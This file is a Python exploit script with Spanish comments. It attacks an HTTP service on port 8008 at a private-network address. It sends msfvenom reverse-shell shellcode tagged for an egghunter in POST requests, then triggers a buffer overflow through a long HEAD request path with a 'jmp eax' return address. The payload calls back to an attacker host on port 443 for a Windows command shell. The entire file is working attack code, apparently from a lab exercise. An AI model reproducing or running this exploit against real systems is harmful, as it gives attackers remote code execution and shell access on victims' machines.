#!/usr/bin/env python

import socket
import requests

host = "192.168.122.213"
port = 8008

# egg tag => puta
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
        "\xef\xb8\x70\x75\x74\x61\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.122.10 LPORT=443 -f python -b "\x00\x0a\x0d"
shellcode = "putaputa"
shellcode += "\xdb\xce\xd9\x74\x24\xf4\xba\x85\xd2\x35\x8a\x5b"
shellcode += "\x29\xc9\xb1\x52\x31\x53\x17\x03\x53\x17\x83\x6e"
shellcode += "\x2e\xd7\x7f\x8c\x27\x9a\x80\x6c\xb8\xfb\x09\x89"
shellcode += "\x89\x3b\x6d\xda\xba\x8b\xe5\x8e\x36\x67\xab\x3a"
shellcode += "\xcc\x05\x64\x4d\x65\xa3\x52\x60\x76\x98\xa7\xe3"
shellcode += "\xf4\xe3\xfb\xc3\xc5\x2b\x0e\x02\x01\x51\xe3\x56"
shellcode += "\xda\x1d\x56\x46\x6f\x6b\x6b\xed\x23\x7d\xeb\x12"
shellcode += "\xf3\x7c\xda\x85\x8f\x26\xfc\x24\x43\x53\xb5\x3e"
shellcode += "\x80\x5e\x0f\xb5\x72\x14\x8e\x1f\x4b\xd5\x3d\x5e"
shellcode += "\x63\x24\x3f\xa7\x44\xd7\x4a\xd1\xb6\x6a\x4d\x26"
shellcode += "\xc4\xb0\xd8\xbc\x6e\x32\x7a\x18\x8e\x97\x1d\xeb"
shellcode += "\x9c\x5c\x69\xb3\x80\x63\xbe\xc8\xbd\xe8\x41\x1e"
shellcode += "\x34\xaa\x65\xba\x1c\x68\x07\x9b\xf8\xdf\x38\xfb"
shellcode += "\xa2\x80\x9c\x70\x4e\xd4\xac\xdb\x07\x19\x9d\xe3"
shellcode += "\xd7\x35\x96\x90\xe5\x9a\x0c\x3e\x46\x52\x8b\xb9"
shellcode += "\xa9\x49\x6b\x55\x54\x72\x8c\x7c\x93\x26\xdc\x16"
shellcode += "\x32\x47\xb7\xe6\xbb\x92\x18\xb6\x13\x4d\xd9\x66"
shellcode += "\xd4\x3d\xb1\x6c\xdb\x62\xa1\x8f\x31\x0b\x48\x6a"
shellcode += "\xd2\xf4\x25\x0e\x28\x9d\x37\xee\x2d\xe6\xb1\x08"
shellcode += "\x47\x08\x94\x83\xf0\xb1\xbd\x5f\x60\x3d\x68\x1a"
shellcode += "\xa2\xb5\x9f\xdb\x6d\x3e\xd5\xcf\x1a\xce\xa0\xad"
shellcode += "\x8d\xd1\x1e\xd9\x52\x43\xc5\x19\x1c\x78\x52\x4e"
shellcode += "\x49\x4e\xab\x1a\x67\xe9\x05\x38\x7a\x6f\x6d\xf8"
shellcode += "\xa1\x4c\x70\x01\x27\xe8\x56\x11\xf1\xf1\xd2\x45"
shellcode += "\xad\xa7\x8c\x33\x0b\x1e\x7f\xed\xc5\xcd\x29\x79"
shellcode += "\x93\x3d\xea\xff\x9c\x6b\x9c\x1f\x2c\xc2\xd9\x20"
shellcode += "\x81\x82\xed\x59\xff\x32\x11\xb0\xbb\x43\x58\x98"
shellcode += "\xea\xcb\x05\x49\xaf\x91\xb5\xa4\xec\xaf\x35\x4c"
shellcode += "\x8d\x4b\x25\x25\x88\x10\xe1\xd6\xe0\x09\x84\xd8"
shellcode += "\x57\x29\x8d"

# "subir" la shellcode para que el egghunter pueda encontrarla
req = 'POST /coffee HTTP/1.1\r\n'
req += 'Host: ' + host + '\r\n'
req += 'Content-Length: {}\r\n\r\n'.format(len(shellcode))
req += shellcode + '\r\n'
req += '\r\n'
for i in range(3):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(req)
    s.close()

# jmp eax 0x625012F2
ret = "f2125062"
sploit = egghunter.encode('hex') + "A"*(72-len(egghunter.encode('hex'))) + ret

buf = "HEAD /" + sploit + " HTTP/1.1\r\n"
buf += "Host: " + host + ":" + str(port) + "\r\n"
buf += "Accept: */*\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
print("[*] Sending " + str(len(sploit)) + " bytes")
s.send(buf)
s.close()

